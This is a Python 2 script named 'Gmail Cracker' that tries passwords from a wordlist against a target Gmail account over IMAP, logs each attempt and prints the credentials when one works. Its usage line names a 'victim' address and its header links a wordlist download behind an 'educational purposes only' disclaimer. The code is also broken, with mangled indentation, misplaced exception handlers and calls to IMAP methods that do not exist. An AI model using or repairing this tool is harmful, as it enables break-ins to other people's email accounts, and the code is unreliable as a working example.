#!/usr/bin/python
# -*- coding: utf-8 -*-
# Gmail Cracker modded by ..:: crazyjunkie ::.. 2014
# This program is only for educational purposes only.
# If you need a Good Wordlist ====> http://uploaded.net/folder/j7gmyz

import sys, imaplib, time 
from imaplib import IMAP4

log = "GmailGhost.log"
file = open(log, "a")
counter = 0
face = '''
                        :::Gmail Cracker:::
        '''

help = '''
Usage : ./gmail.py -u [email] -w [wordlist]
Example : ./gmail.py -u victim@gmail.Com -w wordlist.txt
'''
    
for arg in sys.argv:
    if arg.lower() == '-u' or arg.lower() == '--user':
                email = sys.argv[int(sys.argv.index(arg))+1]
        elif arg.lower() == '-w' or arg.lower() == '--wordlist':
            wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]
        elif arg.lower() == '-h' or arg.lower() == '--help':
            print face
            print help
            file.write(face)
            file.write(help)

#Change these if needed.
HOST = 'imap.gmail.com'
PORT = 993

try:
    preventstrokes = open(wordlist, "r")
    words            = preventstrokes.readlines()
    count          = 0 
    while count < len(words):
        words[count] = words[count].strip() 
        count += 1 
except(IOError): 
      print "\n[-] Error: Check your wordlist path\n"
    file.write("\n[-] Error: Check your wordlist path\n")
      sys.exit(1)
def definer():
    print "-" * 60
    print "[+] Email         : %s" % email
    print "[+] Wordlist         : %s" % wordlist
    print "[+] Length wordlist     : %s " % len(words)
    print "[+] Time Starting     : %s" % time.strftime("%X")
    print "-" * 60
    file.write ("\n[+] Email : %s" % email)
    file.write ("\n[+] Wordlist : %s" % wordlist)
    file.write ("\n[+] length wordlist : %s " % len(words))
    file.write ("\n[+] Time Starting : %s" % time.strftime("%X"))
    
def main(password):
    global counter
    sys.stdout.write ("[-] Trying : %s \n" % (password))
    sys.stdout.flush()
    file.write("[-] Trying : %s \n" % (str(password)))
    try:
        IMAP4 = imaplib.IMAP4_SSL(HOST, PORT)
            IMAP4.Email(email)
            IMAP4.Passwd(password)  
            IMAP4.quit()
            print "[+] enjoy !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Found!" % (email, password)
            file.write("[+] enjoy !!!\n[+] Username : [%s]\n[+] Password : [%s]\n[+] Status : Found!" % (email, password))
            sys.exit(1)
        except Exception, e:
            pass 
        except KeyboardInterrupt:
        print "\n[-] Aborting...\n"
        file.write("\n[-] Aborting...\n")
        sys.exit(1)
    counter+=1
    if counter == len(words)/5:
        print "[+] Gmailcracker 20% way done..."
        print "[+] Please be patient..."    
        file.write("[+] Gmailcracker on 1/4 way done...\n")
        file.write("[+] Please be patient...\n")
    elif counter == len(words)/4:
        print "[+] Gmailcracker 25% way done..."
        print "[+] Please be patient..."    
        file.write("[+] Gmailcracker on 1/4 way done...\n")
        file.write("[+] Please be patient...\n")
    elif counter == len(words)/2:
        print "[+] Gmailcracker on 50% done..."
        print "[+] Please be patient..."    
        file.write("[+] Gmailcracker on halfway done...\n")
        file.write("[+] Please be patient...\n")
    elif counter == len(words):
        print "[+] Gmailcracker done...\n"
        file.write("[+] Gmailcracker done...!\n")    
    
if __name__ == '__main__':
    print face
    file.write(face)
    definer()
    for password in words:
        main(password.replace("\n",""))
    main(password)
